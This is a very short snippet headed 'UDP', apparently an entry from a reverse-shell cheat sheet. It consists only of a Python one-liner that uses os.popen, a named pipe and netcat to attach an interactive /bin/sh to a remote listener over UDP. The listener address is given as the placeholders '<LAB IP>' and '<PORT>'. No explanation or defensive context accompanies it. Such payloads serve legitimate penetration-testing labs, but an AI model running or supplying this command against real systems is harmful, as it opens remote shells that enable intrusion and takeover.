## UDP

```
import os;​ os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u <LAB IP> <PORT> >/tmp/f &").read()​
​```
